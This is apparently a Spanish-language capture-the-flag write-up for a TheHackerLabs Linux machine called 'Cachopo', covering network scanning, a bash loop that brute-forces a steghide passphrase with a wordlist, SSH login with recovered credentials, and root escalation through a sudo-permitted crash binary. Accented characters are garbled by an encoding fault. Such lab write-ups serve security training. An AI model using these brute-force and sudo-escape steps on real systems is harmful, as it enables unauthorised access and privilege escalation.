---
title: "TheHackerLabs - Avanzado : [Cachopo]"
date: 2024-08-12 13:35:00 +0200
categories: [CTF, Writeups, TheHackerLabs, Linux, Avanzado]
description: "Explora el desaf칤o CTF 'Cachopo', dise침ado para usuarios avanzados en un entorno Linux."
tags: [CTF, Writeups, TheHackerLabs, Linux, Avanzado]
image: /img/posts/CTF/cachopo/cachopo.png
---

# Writeup: TheHackerLabs - Cachopo

## Introducci칩n

**Cachopo** es un CTF avanzado creado por TheHackerLabs, dise침ado para desafiar las habilidades de los usuarios experimentados en Linux. El objetivo es identificar servicios vulnerables, explotarlos y capturar la flag final. 

游깷 [**Web oficial del CTF: TheHackersLabs - Cachopo**](https://thehackerslabs.com/cachopo/)

---

## 1. Descubrimiento de la M치quina Objetivo

Iniciamos el desaf칤o identificando la direcci칩n IP de la m치quina objetivo en nuestra red local utilizando `arp-scan`:

```bash
# arp-scan -I ens36 --localnet
172.18.0.134  00:0c:29:f3:5c:ae    VMware, Inc.
```

La IP de la m치quina objetivo es **172.18.0.134**.

---

## 2. Enumeraci칩n de Servicios

Realizamos un escaneo completo de puertos utilizando `nmap`:

```bash
# nmap -p- --min-rate 2000 -sS -Pn -oN allports 172.18.0.134
```

**Resultados principales:**
- **22/tcp:** OpenSSH 9.2p1 (Debian)
- **80/tcp:** Apache httpd 2.4.61

El an치lisis del puerto 80 revel칩 una redirecci칩n a `http://cachopo.thl/`. Configuramos `/etc/hosts` para incluir el dominio:

```bash
# echo "172.18.0.134 cachopo.thl" | tee -a /etc/hosts
```

---

## 3. An치lisis del Servidor Web y Datos Ocultos

El sitio web conten칤a una imagen sospechosa. Usamos **Steghide** para analizarla, pero estaba protegida con contrase침a. Realizamos un ataque de fuerza bruta con la lista `rockyou.txt`:

**Script simplificado para fuerza bruta:**
```bash
#!/bin/bash
while read password; do
    steghide --extract -sf cachopo.jpg -p "$password" 2>/dev/null && echo "Contrase침a: $password" && break
done < /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```bash
Contrase침a: doggies
```

Extrajimos un archivo que nos redirigi칩 a un directorio oculto con m치s datos sensibles.

---

## 4. Escalaci칩n de Privilegios

Nos conectamos al servidor utilizando SSH con las credenciales encontradas y analizamos los permisos del usuario:

```bash
# ssh carlos@172.18.0.134
# sudo -l
User carlos may run the following commands on Cachopo:
    (ALL) NOPASSWD: /usr/bin/crash
```

El binario `/usr/bin/crash` se explot칩 para escalar privilegios siguiendo las instrucciones de [GTFOBins](https://gtfobins.github.io/gtfobins/crash/).

```bash
carlos@Cachopo:~$ sudo /usr/bin/crash
crash> !/bin/bash
root@Cachopo:/home/carlos# whoami
root
```

## Reflexi칩n Final

El CTF **Cachopo** destaca la importancia de una buena enumeraci칩n y el an치lisis de servicios. Adem치s, pone en pr치ctica habilidades como fuerza bruta y escalaci칩n de privilegios. Es un reto ideal para usuarios avanzados que buscan explorar vulnerabilidades reales.

춰Gracias por leer este writeup! Si tienes preguntas, no dudes en contactarme.  
Un saludo,  
칍scar
